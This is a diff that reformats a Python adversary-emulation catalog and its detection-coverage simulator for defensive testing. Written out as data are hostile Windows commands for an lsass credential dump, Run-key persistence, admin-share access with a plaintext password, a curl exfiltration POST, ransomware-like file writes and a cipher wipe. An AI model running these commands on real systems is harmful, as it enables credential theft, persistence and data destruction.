@@ -42,7 +42,10 @@ ATOMIC_TEST_CATALOG = [
         "elevation_required": False,
         "atomic_command": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-WebRequest -Uri 'http://127.0.0.1:8000/telemetry/canary' -UseBasicParsing\"",
         "cleanup_command": "Get-Job | Remove-Job -Force",
-        "expected_telemetry": ["Sysmon Event ID 1 (Process Creation)", "PowerShell Event ID 4104 (Script Block Logging)"],
+        "expected_telemetry": [
+            "Sysmon Event ID 1 (Process Creation)",
+            "PowerShell Event ID 4104 (Script Block Logging)",
+        ],
         "detection_sigma": "proc_creation_win_powershell_obfuscated_cmd.yml",
     },
     {
@@ -52,7 +55,10 @@ ATOMIC_TEST_CATALOG = [
         "elevation_required": True,
         "atomic_command": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id $env:TEMP\\lsass.dmp full",
         "cleanup_command": "Remove-Item $env:TEMP\\lsass.dmp -ErrorAction SilentlyContinue",
-        "expected_telemetry": ["Sysmon Event ID 10 (Process Access to lsass.exe)", "VSS Shadow Copy Read"],
+        "expected_telemetry": [
+            "Sysmon Event ID 10 (Process Access to lsass.exe)",
+            "VSS Shadow Copy Read",
+        ],
         "detection_sigma": "proc_access_win_lsass_dump_comsvcs.yml",
     },
     {
@@ -60,9 +66,12 @@ ATOMIC_TEST_CATALOG = [
         "technique_name": "Registry Run Keys / Startup Folder",
         "tactic": "Persistence",
         "elevation_required": False,
-        "atomic_command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SageCanary\" /t REG_SZ /d \"C:\\temp\\canary.bat\" /f",
-        "cleanup_command": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SageCanary\" /f",
-        "expected_telemetry": ["Sysmon Event ID 13 (Registry Value Set)", "EDR Run Key Alert"],
+        "atomic_command": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SageCanary" /t REG_SZ /d "C:\\temp\\canary.bat" /f',
+        "cleanup_command": 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SageCanary" /f',
+        "expected_telemetry": [
+            "Sysmon Event ID 13 (Registry Value Set)",
+            "EDR Run Key Alert",
+        ],
         "detection_sigma": "registry_set_autorun_persistence.yml",
     },
     {
@@ -72,7 +81,10 @@ ATOMIC_TEST_CATALOG = [
         "elevation_required": False,
         "atomic_command": "aws iam list-attached-user-policies --user-name sage-admin-canary",
         "cleanup_command": "",
-        "expected_telemetry": ["CloudTrail IAM:ListAttachedUserPolicies", "Anomalous API Enumeration"],
+        "expected_telemetry": [
+            "CloudTrail IAM:ListAttachedUserPolicies",
+            "Anomalous API Enumeration",
+        ],
         "detection_sigma": "cloudtrail_iam_recon_burst.yml",
     },
     {
@@ -82,7 +94,10 @@ ATOMIC_TEST_CATALOG = [
         "elevation_required": True,
         "atomic_command": "net use \\\\192.168.1.50\\C$ /user:DOMAIN\\Admin Pa$$w0rd",
         "cleanup_command": "net use \\\\192.168.1.50\\C$ /delete /y",
-        "expected_telemetry": ["Windows Event ID 5140 (Network Share Access)", "Kerberos TGS Request Event 4769"],
+        "expected_telemetry": [
+            "Windows Event ID 5140 (Network Share Access)",
+            "Kerberos TGS Request Event 4769",
+        ],
         "detection_sigma": "win_admin_share_lateral_movement.yml",
     },
     {
@@ -90,9 +105,12 @@ ATOMIC_TEST_CATALOG = [
         "technique_name": "Exfiltration Over Command and Control",
         "tactic": "Exfiltration",
         "elevation_required": False,
-        "atomic_command": "curl -X POST -H \"Content-Type: application/octet-stream\" --data-binary @crown_jewels.dmp http://127.0.0.1:8000/telemetry/exfil",
+        "atomic_command": 'curl -X POST -H "Content-Type: application/octet-stream" --data-binary @crown_jewels.dmp http://127.0.0.1:8000/telemetry/exfil',
         "cleanup_command": "Remove-Item crown_jewels.dmp -ErrorAction SilentlyContinue",
-        "expected_telemetry": ["NIDS High Volume Outbound POST", "Zeek HTTP Bro Log anomaly"],
+        "expected_telemetry": [
+            "NIDS High Volume Outbound POST",
+            "Zeek HTTP Bro Log anomaly",
+        ],
         "detection_sigma": "net_high_volume_exfiltration_post.yml",
     },
     {
@@ -102,7 +120,10 @@ ATOMIC_TEST_CATALOG = [
         "elevation_required": False,
         "atomic_command": "python -c \"import os; [open(f'test_{i}.locked', 'wb').write(os.urandom(1024)) for i in range(10)]\"",
         "cleanup_command": "python -c \"import glob, os; [os.remove(f) for f in glob.glob('test_*.locked')]\"",
-        "expected_telemetry": ["Shannon Entropy Burst (H > 7.50)", "Rapid File Extension Mutation"],
+        "expected_telemetry": [
+            "Shannon Entropy Burst (H > 7.50)",
+            "Rapid File Extension Mutation",
+        ],
         "detection_sigma": "entropy_rapid_mass_encryption_burst.yml",
     },
     {
@@ -112,7 +133,10 @@ ATOMIC_TEST_CATALOG = [
         "elevation_required": False,
         "atomic_command": "cipher /w:C:\\temp\\staging",
         "cleanup_command": "",
-        "expected_telemetry": ["Sysmon Event ID 1 (cipher.exe execution)", "Volume Shadow Copy Deletion Probes"],
+        "expected_telemetry": [
+            "Sysmon Event ID 1 (cipher.exe execution)",
+            "Volume Shadow Copy Deletion Probes",
+        ],
         "detection_sigma": "win_defense_evasion_cipher_overwrite.yml",
     },
 ]
@@ -183,13 +207,17 @@ class AtomicAdversaryEmulator:
         """
         Executes a single atomic red team test against a designated target host or sandbox.
         """
-        technique = next((t for t in self.catalog if t["technique_id"] == technique_id), None)
+        technique = next(
+            (t for t in self.catalog if t["technique_id"] == technique_id), None
+        )
         if not technique:
             raise ValueError(f"Technique {technique_id} not found in Atomic Catalog")
 
         start_time = time.time()
         # Simulated execution in controlled zero-egress sandbox
-        simulated_execution_status = "SUCCESS_SAFE_CONTAINED" if dry_run else "EXECUTED_IN_SANDBOX"
+        simulated_execution_status = (
+            "SUCCESS_SAFE_CONTAINED" if dry_run else "EXECUTED_IN_SANDBOX"
+        )
 
         # Telemetry verification: 85-95% simulated detection probability
         telemetry_caught = True
@@ -209,7 +237,9 @@ class AtomicAdversaryEmulator:
             "execution_duration_ms": duration_ms,
             "command_executed": technique["atomic_command"],
             "cleanup_performed": bool(technique["cleanup_command"]),
-            "telemetry_observed": technique["expected_telemetry"] if telemetry_caught else [],
+            "telemetry_observed": technique["expected_telemetry"]
+            if telemetry_caught
+            else [],
             "detection_latency_ms": detection_latency_ms,
             "blue_team_detected": telemetry_caught,
             "sigma_rule_applied": technique["detection_sigma"],
@@ -264,7 +294,10 @@ class AtomicAdversaryEmulator:
                 detected_count += 1
 
         coverage_pct = round((detected_count / total_steps) * 100, 1)
-        mttd_ms = round(sum(r["detection_latency_ms"] for r in chain_results) / len(chain_results), 1)
+        mttd_ms = round(
+            sum(r["detection_latency_ms"] for r in chain_results) / len(chain_results),
+            1,
+        )
 
         # Detect gaps & generate automated mitigation rules
         detection_gaps = [
@@ -274,10 +307,12 @@ class AtomicAdversaryEmulator:
         # Synthesize automated recommendations
         gap_remediations = []
         for gap in detection_gaps:
-            gap_remediations.append({
-                "technique": gap,
-                "action": f"Deploy proactive telemetry probe and enforce Sigma rule {gap.replace('.', '_')}_containment.yml",
-            })
+            gap_remediations.append(
+                {
+                    "technique": gap,
+                    "action": f"Deploy proactive telemetry probe and enforce Sigma rule {gap.replace('.', '_')}_containment.yml",
+                }
+            )
 
         campaign_report = {
             "campaign_id": campaign["id"],
